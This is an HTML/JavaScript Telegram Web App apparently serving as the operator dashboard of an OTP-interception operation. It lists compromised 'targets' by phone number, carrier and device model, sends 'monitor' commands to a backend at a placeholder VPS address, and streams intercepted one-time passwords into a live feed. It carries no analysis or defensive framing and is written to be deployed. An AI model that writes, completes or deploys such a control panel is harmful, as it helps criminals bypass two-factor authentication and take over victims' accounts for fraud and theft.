<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>FORx OTP Center</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background:#0a0a0a; color:#e0e0e0; font-family:system-ui; margin:0; padding:15px; }
        .card { background:#1e1e1e; border-radius:12px; padding:15px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center; }
        .btn { background:#2ecc71; border:none; color:#000; padding:8px 16px; border-radius:6px; font-weight:bold; cursor:pointer; }
        .btn.stop { background:#e74c3c; }
        #feed { height:300px; overflow-y:auto; background:#111; border-radius:8px; padding:10px; }
        .otp { background:#2c3e50; margin:5px 0; padding:8px; border-radius:5px; font-size:14px; }
        input[type=text] { width:100%; padding:8px; margin-bottom:10px; border-radius:5px; border:none; }
    </style>
</head>
<body>
    <h2>🔥 FORx OTP Center</h2>
    <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
    <div id="targets"></div>
    <hr>
    <h3>⚡ Live Feed</h3>
    <div id="feed"></div>

    <script>
        const tg = Telegram.WebApp;
        const API = 'http://your-vps-ip:8000';  // change to your VPS IP/domain
        const userId = tg.initDataUnsafe.user.id;
        let allTargets = [];

        async function loadTargets() {
            try {
                let res = await fetch(`${API}/api/targets`, { headers: { 'Authorization': userId } });
                allTargets = await res.json();
                renderTargets(allTargets);
            } catch(e) { console.error(e); }
        }

        function renderTargets(targets) {
            let html = '';
            targets.forEach(t => {
                html += `<div class="card" data-phone="${t.phone1}">
                    <div>
                        <b>${t.phone1}</b> (${t.carrier1})<br>
                        <small>${t.model} | DB-${t.db_index}</small>
                    </div>
                    <button class="btn" onclick="monitorDevice('${t.did}', ${t.db_index}, '${t.model}', '${t.phone1} (${t.carrier1})')">▶️ Monitor</button>
                </div>`;
            });
            document.getElementById('targets').innerHTML = html || '<p>No targets online.</p>';
        }

        function filterTargets() {
            let query = document.getElementById('search').value.toLowerCase();
            let filtered = allTargets.filter(t => t.phone1.includes(query) || (t.phone2 && t.phone2.includes(query)));
            renderTargets(filtered);
        }

        async function monitorDevice(did, dbIndex, model, phoneStr) {
            await fetch(`${API}/api/monitor`, {
                method: 'POST',
                headers: { 'Content-Type':'application/json', 'Authorization': userId },
                body: JSON.stringify({ did, db_index: dbIndex, model, phone_str: phoneStr })
            });
            tg.showAlert('Monitoring started');
        }

        // WebSocket for live OTPs
        let ws = new WebSocket(`ws://your-vps-ip:8000/api/ws?user_id=${userId}`);
        ws.onmessage = (e) => {
            let data = JSON.parse(e.data);
            let feed = document.getElementById('feed');
            feed.innerHTML += `<div class="otp">${data.text}</div>`;
            feed.scrollTop = feed.scrollHeight;
        };

        loadTargets();
        setInterval(loadTargets, 30000);
    </script>
</body>
</html>
